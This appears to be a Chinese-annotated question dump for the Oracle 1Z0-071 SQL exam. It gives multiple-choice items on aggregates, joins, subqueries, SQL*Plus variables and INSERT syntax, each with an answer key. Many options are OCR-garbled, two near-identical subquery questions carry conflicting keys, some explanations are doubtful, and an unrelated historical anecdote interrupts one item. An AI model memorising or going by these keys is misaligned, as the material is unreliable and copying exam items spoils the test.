SUM (salary) FROM employees GROUP BY dept_id, join_date; B. SELECT dept_id, join_date, SUM (salary) FROM employees GROUP BY dept_id; C. SELECT dept_id, MAX (AVG (Salary)) FROM employees GROUP BY dept_id D. SELECT dept_id, AVG (MAX (salary)) FROM employees GROUP BY dept_id, Correct Answer: A Explanation/Reference: 考点： group by QUESTION 2 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which query will provide the required output? A. SELECT LISTAGG (last name) WITHIN GROUP ORDER BY (hire date) &quot;Emp list&quot;, MIN (hire date) &quot;Earliest&quot; FROM employees WHERE department id = 30; B. SELECT LISTAGG (last name, ; &apos;) WITHIN GROUP (ORDER BY hire date) &quot;Emp list&quot;, MIN (hire date) &quot;Earliest&quot; FROM employees WHERE department id= 30; C. SELECT LISTAGG (last name, &apos;; &quot;) &quot;Emp list&quot;, MIN (hire date) &quot;Earliest&quot; FROM employees WHERE department id30 WITHIN GROUP ORDER BY hire date; D. SELECT LISTAGG (last name,;&quot;) &quot;EMP LIST&quot;, MIN (hire date) &quot;Earliest&quot; ROM employees WHERE department id= 30 ORDER BY hire date; Correct Answer: B Explanation/Reference: 考点： listagg() WITHIN GROUP () listagg() WITHIN GROUP () 将多行合并成一行(比较常用) QUESTION 3 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which statement is true about aggregate functions? A. aggregate functions can be used in any clause of a SELECT statement. B. The AVG function implicitly converts NULLS to zero. C. Aggregate functions can be nested to any number of levels. D. The MAX and MIN functions can be used on columns with character data types. Correct Answer: D Explanation/Reference: 考点：聚合函数 A 错聚合函数不能用在 where子句 B 错聚合函数无视空值，不会将 null变成zero C 错聚合函数可以嵌套到任意数量的级别，明显错误，例如 select max(min(&apos;a&apos;)) from dual; D 对比较字母 ACEII QUESTION 4 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Table ORDER_ITEMS contains columns ORDER_ID,UNIT_PRICE and QUANTITY,of data type NUMBER. Which two statements are true? A. Statement 2 returns only one row of output. B. Both the statement give the same output. C. Both statements will return NULL if either UNIT_PRICE or QUANTITY contains NULL. D. Statement 2 may return multiple rows of output. E. Statement 1 returns only one row of output. Correct Answer: DE Explanation/Reference: 语句1，只返回一行。语句2，group by 返回多行 SCOTT@testdb&gt;select max(sal * comm) from emp; MAX(SAL*COMM) 1888000 SCOTT@testdb&gt;select max(sal * comm) from emp group by empno; MAX(SAL*COMM) 480000 625000 1750000 0 1888000 0 0 17 rows selected. Exam D 多表连接 QUESTION 1 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about a self join? A. The join key column must have an index. B. It can be a left outer join. C. It must be a full outer join. D. It can be an inner join. E. It must be an equijoin. Correct Answer: BD Explanation/Reference: 考点：多表连接关于自连接，哪两个陈述是正确的? The join key column must have an index. 连接键列必须有索引。错 It can be a left outer join. 它可以是一个左外连接。对 It must be a full outer join. 它必须是一个完整的外部连接。错 It can be an inner join. 它可以是一个内连接。对 It must be an equijoin. 必须是等连接。错 QUESTION 2 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 choose the best answer Examine the commands used to create DEPARTMENT_DETAILS and COURSE_DETAILS: SQL&gt; CREATE TABLE DEPARTMENT_DETAILS ( DEPARTMENT_ID NUMBER PRIMARY KEY, DEPARTMENT_NAME VARCHAR2(50) , HOD VARCHAR2(50) ); SQL&gt; CREATE TABLE COURSE_DETAILS ( COURSE_ID NUMBER PRIMARY KEY, COURSE_NAME VARCHAR2 (50) , DEPARTMENT_ID NUMBER REFERENCES DEPARTMENT_DETAILS(DEPARTMENT_ID) ); You want to generate a list of all department IDs that do not exist in the COURSE_DETAILS table. You execute the SQL statement: SQL&gt; SELECT d.department_id FROM course_details c INNER JOIN department_details d ON c.department_id&lt;&gt;d.department_id; What is the outcome? A. It executes successfully and displays the required list. B. It executes successfully but displays an incorrect list. C. It fails because the ON clause condition is not valid D. It fails because the join type used is incorrect. Correct Answer: B Explanation/Reference: 考点：联表 题目含义：查询 department 部门id 不存在在于课程详细信息表中的列表。 SELECT d.department_id FROM department_details d where d.department_id not in (select department_id from COURSE_DETAILS); select d (select d.department_id d,c.department c FROM department_details d left join COURSE_DETAILS c on d.department_id = c.department_id) t1 where c is null; QUESTION 3 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 View the Exhibit and examine the structure of the PRODUCT_INFORMATION and INVENTORIES tables. You have a requirement from the supplies department to give a list containing PRODUCT_ID, SUPPLIER_ID, and QUANTITY_ON_HAND for all the products where in QUANTITY_ON_HAND is less than five. Which two SQL statements can accomplish the task? (Choose two.) A. SELECT product_id, quantity_on_hand,supplier_id FROM product_information NATURAL JOIN inventories AND quantity_on_hand &lt; 5; B. SELECT i.product_id, i.quantity_on_hand,pi.supplier_id FROM product_information pi JOIN inventories i ON (pi.product_id=i.product_id) AND quantity_on_hand &lt; 5; C. SELECT i.product_id, i.quantity_on_hand,pi.supplier_id FROM product_information pi JOIN inventories i USING (product_id) AND quantity_on_hand &lt; 5; D. SELECT i.product_id, i.quantity_on_hand,pi.supplier_id FROM product_information pi JOIN inventories i ON (pi.product_id=i.product_id) WHERE quantity_on_hand &lt; 5; Correct Answer: BD Explanation/Reference: 考点：联表 语法不对，执行时显示 ORA-00933: SQL命令未正确结束 QUESTION 4 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 There is a parent/child relationship between EMRLOYEE_ID and MANAGER ID. You want to display the name, loining date, and manager for all the employees. Newly hired employees are yet to be assigned a department or a manager. For them, &quot;No Manager&apos; should be displayed in the MANAGER column. Which SQL query gets the required output? A. SELECT e. last name, e. hire date, NvL(m. last name, &quot;No Manager&apos;) Manager FROM employees e JoIN employees m ON (e. manager idsm. employee id); B. SELECT e. last name, e. hire date, Nvl (m. last name, No Managert) Manager FROM employees e LEFT OUTER JoIN employees : ON (e. manager id =n. employee id); C. SELECT e. lant name, e. hire date, NvL(m. last name. No Manager&quot;) Manager) FROM employees e RIGHT OUTER JoIN employeeam on (e. manager id . amployee id). D. SELECT e. last name, e. hire date, NvL(m. last name, &quot;No Manager&apos;) Manager FROM employeen o NATURAL JOIN employees m ON (e. managesid .m. employee id); Correct Answer: B Explanation/Reference: 考点：联表 题目要求 last_name, hire_date, 领导名称（如果没有则显示 &quot;No Manager&apos; ） left outer join QUESTION 5 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 which two statements are true regarding non-equijoins? A. Table aliases must be used. B. The SQL；1999 compliant ANSI join syntax must be used. C. The ON clause can be used. D. The USING clause can be used. E. The Oracle join syntax can be used. Correct Answer: CE Explanation/Reference: 考点：联接非等值联结的说法正确的两个？ A 错可以不用表别名 B 错可以不用 join C 对可以使用 on D 错 using 不能再不等值连接中使用 E 对 join 语法可以被使用 右连接 from a right join b on a.id=b.id 等效于 from a,b where a.id(+)=b.id左连接 from a left join b on a.id=b.id 等小于 from a,b where a.id=b.id(+) count(*) 会统计为null的行;count(列名)则不统计null的行不等连接 from a,b where a.id between b.cc and b.dd自连接 from a t1,b t2 whee t1.id=t2.idd笛卡尔连接 from a,b QUESTION 6 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about inner and outer joins? A. A left or right outer join returns only unmatched rows. B. An inner join returns matched rows. C. A full outer join returns matched and unmatched rows. D. A full outer join must use Oracle syntax. E. Outer joins can be used when there are multiple join conditions on two tables. F. Outer joins can only be used between two tables per query. Correct Answer: BCE Explanation/Reference: 考点：连表分析：BCE A 错 on 条件是匹配 B 对内连接返回匹配行 C 对全外连接输出两个表，条件匹配部分合并一行 D 错 SQL也可以实现 E 对支持 on 的多个条件 F 错可以 Join 多个表 QUESTION 7 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about selecting related rows from two based on an Entity Relationship Diagram(ERD)? A. AN inner join relates rows within the same table. B. Rows from unrelated tables cannot be joined. C. Every relationship between the two tables must be implemented in a join condition. D. Relating data from a table with data from the same tables is implemented with a self join E. Implementing a relationship between two tables might require joining additional tables. Correct Answer: CE Explanation/Reference: 分析：CE A 错不是多表查询 B 错建关系表 C 对两个表之间的每个关系都必须在联接条件下实现。 D 错不是多表查询 E 对实现两个表之间的关系可能需要连接其他表。 QUESTION 8 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the CUSTOMERS table: You must determine if any customers` details have been entered more than once using a different CUSTNO,by listing all duplicate names. Which two methods can you use to get the required result? A. self join B. subquery C. FULL OUTER JOIN with self join D. RIGHT OUTER JOIN with self join E. LEFT OUTER JOIN with self join Correct Answer: AB Explanation/Reference: 分析：AB列出所有重复的名字 create table customers ( custno number(3) constraint pk_cus_custo primary key, custname varchar2(25) not null, custaddress varchar2(5) ); insert into customers values (1,&apos;superman&apos;,&apos;China&apos;); insert into customers values (2,&apos;superman&apos;,&apos;China&apos;); select c1.custno,c2.custno,c1.custname,c2.custname from customers c1 join customers c2 on c1.custno != c2.custno and c1.custname = c2.custname; select custname,count(custno) cnt from customers group by custname having count(custno) &gt; 1; drop table customers purge; QUESTION 9 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about a full outer join? A. It includes rows that are returned by a Cartesian product. B. It includes rows that are returned by an inner join. C. It returns only unmatched rows from both tables being joined. D. It return matched and unmatched rows from both tables being joined. E. The Oracle join operator (+) must be used on both sides of the join condition in the WHERE clause. Correct Answer: BD Explanation/Reference: 关于全外连接，哪两个表述是正确的? A 错不包括笛卡尔 C 错匹配与不匹配都返回 E 错用 where 就不用 join QUESTION 10 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about the Oracle join and ANSI join syntax? A. The SQL: 1999 compliant ANSI join syntax supports creation of a Cartesian product of two tables. B. The Oracle join syntax performs less well than the SQL: 1999 compliant ANSI join syntax. C. The SQL: 1999 compliant ANSI join syntax supports natural joins. D. The Oracle join syntax performs better than the SQL: 1999 compliant ANSI join syntax. E. The Oracle join syntax supports creation of a Cartesian product of two tables. F. The Oracle join syntax supports natural joins. G. The oracle join syntax only supports right outer joins. Correct Answer: CEF Explanation/Reference: QUESTION 11 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine this query: SELECT 2 FROM dual d1 CROSS JOIN dual d2 CROSS JOIN dual d3; What is returned upon execution? A. 0 rows B. an error C. 8 rows D. 6 rows E. 1 rows F. 3 rows Correct Answer: E Explanation/Reference: 分析：E返回 2。笛卡儿乘积连接：即不加任何条件，达到 M*N 的结果集。 Dual 虚拟表是单行单列。 QUESTION 12 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 What is true about non-equijoin statement performance? A. The Oracle join syntax performs better than the SQL: 1999 compliant ANSI join syntax. B. Table aliases can improve performance. C. The BETWEEN condition always performs less well than using the &gt;= and &lt;= conditions. D. The join syntax used makes no difference to performance. E. The BETWEEN condition always performs better than using the &gt;=land k=conditions. Correct Answer: BD Explanation/Reference: 分析：BD B 对别名提高性能 D 对 join 性能一样 QUESTION 13 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about a self join? A. It must be an inner join. B. It can be an outer join. C. The on clause must be used. D. It must be an equijoin. E. The query must use two different aliases for the table. F. The on clause can be used. Correct Answer: BEF Explanation/Reference: 分析：BEF C 错 join on 可以用 from 表 1，表 2 where 代替 D 错不等值也可以 Exam E 子查询 QUESTION 1 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true regarding subqueries？（Choose two.） A. Only two subqueries can be placed at one level. B. A subquery can be used to access data from one or more tables or views. C. If the subquery retumns 0 rows，then the value retumed by the subquery expression is NULL. D. The columns in a subquery must always be qualified with the name or alias of the table used E. A subquery in the WHERE dause of a SELECT statement can be nested up to three levels only Correct Answer: BC Explanation/Reference: 考点：子查询 QUESTION 2 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 View the Exhibit and examine the structure of the PRODUCRS table. Which two tasks would require subqueries？ A. Display the minimum list price for each product status. B. Display all suppliers whose list price is less than 1000 C. Display the number of products whose list price is more than the average list price. D. Display the total number of products supplied by supplier 102 and have product status as &apos;obsolete&apos;. E. Display all products whose minimum list price is more than the average list price of products and have the status&apos;orderable&apos;. Correct Answer: CE Explanation/Reference: 考点：子查询 A 错查询每个产品 product_status的昀小值无需子查询 B 错查询价格小于 1000 的产品的提供商无需子查询 C 对查询价格高于平均产品的价格的产品数量需子查询 D 错查询由 102提供的产品总数，且product_status状态为 obsolete E 对 QUESTION 3 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 View the Exhibit and examine the data in the PRODUCT_INFORMATION table. Which two tasks would require subqueries？（Choose two.）. A. displaying all supplier IDs whose average list price is more than 500 B. displaying the total number of products supplied by supplier 102071 and having product status OBSOLETE C. displaying all the products whose minimum list prices are more than the average list price of products having the product status orderable D. displaying the number of products whose list prices are more than the average list price E. displaying the minimum list price for each product status Correct Answer: CD Explanation/Reference: 考点：子查询 C 的答案类似于： SQL&gt; select sal from emp where sal &gt; (select avg(sal) from emp where job=&apos;SALESMAN&apos;); D 的答案类似于： SQL&gt; select count(*) from emp where sal &gt; (select avg(sal) from emp); ） QUESTION 4 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Table EMPLOYEES contains columns including EMPLOYEE_ID,JOB_ID and SALARY. Only the EMPLOYEE_ID column is indexed. Rows exist for employees 100 and 200. Examine this statement: UPDATE employees SET (job_id, salary) = (SELECT job_id, salary FROM employees WHERE employee_id = 200) WHERE employee_id = 100; Which two statements are true? A. Employee 100 will have JOB_ID set to the same value as the JOB_ID of employee 200. B. Employee 200 will have SALARY set to the same value as the SALARY of employee 100. C. Employee 200 will have JOB_ID set to the same value as the JOB_ID of employee 100. D. Employee 100 and 200 will have the same SALARY as before the update command. E. Employee 100 will have SALARY set to the same value as the SALARY of employee 200. F. Employee 100 and 200 will have the same JOB_ID s before the update command. Correct Answer: AE Explanation/Reference: 考点：子查询 1. employees_id 在 create table 自动建立索引 using index 需要主键或者唯一 2. employees是唯一，所以 update 必定成功输出 3. 子查询检索内容是 employee_id=200 的行 4. update job_jd,salary 成功，改变 employee_id=100总结：100 被改。开头找只有 100 的。 A 对 B 错 C 错 D 错 E 对 F 错 QUESTION 5 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true regarding single row subqueries? A. They can be used in the WHERE clause. B. A SQL statement may have multiple single row subquery blocks. C. They must be placed on the right side of the comparison operator or condition. D. They must be placed on the left side of the comparison operator or condition. E. They can be used in the HAVING clause. F. They must return a row to prevent errors in the SQL statement Correct Answer: ABE Explanation/Reference: 考点：子查询 关于单行子查询，哪三个语句是正确的? A 对可以在 where子句中使用 B 对一个 SQL语句可以有多个单行子查询块。 CD 错运算符左右兼容 E 对可以在 having子句中使用 F 错子查询可以空值 QUESTION 6 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 View the Exhibits and examine the structure of the COSTS and PROMOTIONS tables. You want to display PROD_IDS whose promotion cost is less than the highest cost PROD_ID in a promotion time interval. What will be the result? A. It executes successfully and gives the required result. B. It gives an error because the ALL keyword is not valid. C. It gives an error because the GROUP BY clause is not valid. D. It executes successfully but does not give the required result. Correct Answer: D Explanation/Reference: 考点：子查询 在促销时间间隔中显示促销成本小于昀高成本PROD_ID的PROD_ID。 create table costs ( prod_id number not null , time_id date not null , promo_id number not null , channel_id number not null , unit_cost number(10,2) not null , unit_price number(10,2) not null ); create table promotions ( promo_id number(6) not null , promo_name varchar(30) not null , promo_subcategory varchar2(30) not null , promo_subcategory_id varchar2(30) not null , promo_category varchar2(30) not null , promo_category_id number not null , promo_cost number(10,2) not null , promo_begin_date date not null , promo_end_date date not null ); select prod_id from costs where promo_id in ( select promo_id from promotions where promo_cost &lt; ALL(select max(promo_cost) from promotions group by (promo_end_date - promo_begin_date)) ); group by 改为 where即可。 用人之道： 陈毅手下的兵A没有完成任务，粟裕上前线指导，陈毅电话A，不让A的团继续打了，要换成其他团； A求粟裕让他继续作战，哪怕死在战场上，也不要被换下去。粟裕思考了一会儿回答让他继续作战，他回去和陈老总商量。 1. 华东和华中刚合并，陈毅手下很多人不服粟裕； 2. 陈毅给粟裕收买人心的机会，技术和政治； 3. 陈毅侧面告诉了粟裕，A的弱点哈哈。 QUESTION 7 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about multiple row subqueries? A. They can contain GROUP BY Clauses. B. They can contain HAVING clauses. C. They can return multiple columns. D. They cannot contain a subquery. E. Two or more values are always returned from the subquery. Correct Answer: ABC Explanation/Reference: 分析ABC D cannot E always QUESTION 8 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 View the Exhibit and examine the structure of the PRODUCTS table. Which two tasks require subqueries? A. Display the total number of products supplied by supplier 102 which have a product status of obsolete. B. Display the number of products whose PROD_LIST_PRICE is more than the average PROD_LIST_PRICE. C. Display the minimum PROD_LIST_PRICE for each product status. D. Display suppliers whose PROD_LIST_PRICE is less than 1000. E. Display products whose PROD_MIN_PRICE is more than the average PROD_LIST_PRTCE of all products, and whose status is orderable. Correct Answer: DE Explanation/Reference: 分析：DE A 错 select count(obsolete) from product B 错 select count(distinct trunc(prod_list_price-avg(prod_list_price) -3))-1 from product 1 减去平均数 2 截断 3 位数的 3 去重 4 计算总数 5 减一 C 错 select min(prod_list_price) from product D 对E QUESTION 9 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the SALES1 table: SALES2 is a table with the same description as SALES1. Some sales data is duplicated in both tables. You want to display the rows from the SALES1 which are not present in the SALES2 table. Which set operator generates the required output? A. UNION ALL B. MINUS C. INTERSECT D. SUBTRACT E. UNION Correct Answer: B Explanation/Reference: 分析 B：求 SALES1 表不包含 SALES2 的内容。 QUESTION 10 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine this SQL statement: DELETE FROM employees e WHERE EXISTS (SELECT &apos;dummy&apos; FROM emp_history WHERE employee_id=e .employee_ id); Which two are true? A. The subquery is executed for every row in the EMPLOYEES table. B. The subquery is not a correlated subquery. C. The subquery is executed before the DELETED statement is executed. D. All existing rows in the EMPLOYEES table are deleted. E. The DELETE statement executes successfully even if the subquery selects multiple rows. Correct Answer: AE Explanation/Reference: 分析:AE D 错两份表条件相等才会删除 QUESTION 11 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine this SQL statement: Which two are true? A. The subquery is executed before the UPDATE statement is executed. B. All existing rows in the ORDERS table are updated. C. The subquery is executed for every updated row in the ORDERS table. D. The UPDATE statement executes successfully even if the subquery selects multiple rows. E. The subquery is not a correlated subquery Correct Answer: AC Explanation/Reference: The subquery is executed before the UPDATE statement is executed.在执行UPDATE语句之前执行子查询。对 All existing rows in the ORDERS table are updated.更新ORDERS表中所有现有行。错 The subquery is executed for every updated row in the ORDERS table.对ORDERS表中每个更新的行执行子查询。 The UPDATE statement executes successfully even if the subquery selects multiple rows. The subquery is not a correlated subquery 即使子查询选择了多行，UPDATE语句也会成功执行。错 The subquery is not a correlated subquery 子查询不是相关的子查询 Exam F SQLPlus和变量 QUESTION 1 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about substitution variables? A. A substitution variable used to prompt for a column name must be enclosed in single quotation marks. B. A substitution variable used to prompt for a column name must be enclosed in double quotation marks. C. A substitution variable can be used with any clause in a SELECT statement. D. A substitution variable prefixed with &amp;&amp; prompts only once for a value in a session unless it is set to undefined in the session. E. A substitution variable can be used only in a SELECT statement. F. A substitution variable prefixed with &amp; always prompts only once for a value in a session. Correct Answer: CD Explanation/Reference: 考点：代换变量关于代换变量，哪两个表述是正确的 A 错不需要引号 B 错不需要引号 C 对替换变量可以与 SELECT语句中的任何子句一起使用。 D 对一个替换变量，在一个会话中只有一次 &amp;&amp;提示符作为值的前缀，除非它在会话中被设置为undefined。 E 错 F 错 only QUESTION 2 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about the SET VERIFY ON command? A. It displays values for variables used only in the WHERE clause of a query. B. It displays values for variables prefixed with ss. C. It can be used only in SQL*Plus. D. It can be used in SQL Developer and SQL*Plus. E. It displays values for variables created by the DEFINE command. Correct Answer: DE Explanation/Reference: 分析：DE SET VERIFY ON 新变量验证，输出一样，区别在于新旧回显 A 错 only B 错 &amp; C 错 only D 对E 对可以显示 define，永远都是 new QUESTION 3 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 You want to write a query that prompts for two column names and the WHERE condition each time it is executed in a session but only prompts for the table name the first time it is executed. The variables used in your query are never undefined in your session. Which query can be used? A. SELECT &amp;co11, &amp;co12 FROM &amp;&amp;table WHERE &amp;condition; B. SELECT &amp;co11, &amp;co12 FROM &quot;&amp;table&quot; WHERE &amp;condition; C. SELECT &amp;&amp;co11, &amp;&amp;col2 FROM &amp;table WHERE &amp;&amp;condition = &amp;&amp;cond; D. SELECT &apos;&amp;c011&apos;,&apos;&amp;&amp;co12&apos; FROM &amp;table WHERE &apos;&amp;&amp;condition&apos;= &apos;&amp;cond&apos;； E. SELECT &amp;&amp;co11, &amp;&amp;c012 FROM &amp;table WHERE &amp;&amp;condition; Correct Answer: A Explanation/Reference: 分析：A找出&amp;&amp;table &amp;每次输入 &amp;&amp;输入一次后保存 QUESTION 4 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine this query: SELECT employee_id, first_name, salary FROM employees WHERE hire_date &gt; ‘&amp;1’; Which two methods should you use to prevent prompting for a hire date value when this query is executed? A. Use the DEFINE command before executing the query. B. Store the query in a script and pass the substitution value to the script when executing it. C. Replace&apos; &apos;&amp;1&apos; with &apos;&amp;&amp;1&apos;in the query. D. Execute the SET VERIFY OFF command before executing the query. E. Use the UNDEFINE command before executing the query. F. Execute the SET VERIFY ON command before executing the query. Correct Answer: AB Explanation/Reference: A 对提前定义变量 B 对脚本输入代替手工输入 C 错还是会提示输出一次的 D 错只是不显示新旧值 E 错 undefine F 错只是显示新旧值 Exam G DML语句的使用 QUESTION 1 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 View the Exhibit and examine the structure of the ORDERS table. The columns ORDER_MODE and ORDER_TOTAL have the default values &apos;direct’ and 0 respectively. Which two INSERT statements are valid？（Choose two.） A. INSERT INTO orders VALUES（1，’09-mar-2007’，&apos;online&apos;，’ ’ ，1000）. B. INSERT INTO orders (order id，order date，order mode， customer id，order total） C. INSERT INTO (select order_id,order_date,customer_id from orders) VALUES(1,&apos;09-mar-2007&apos;,101); D. INSERT INTO orders VALUES(1,&apos;09-mar-2007&apos;,default,101,default); E. INSERT INTO orders（order id，order date，order，mode，order total） 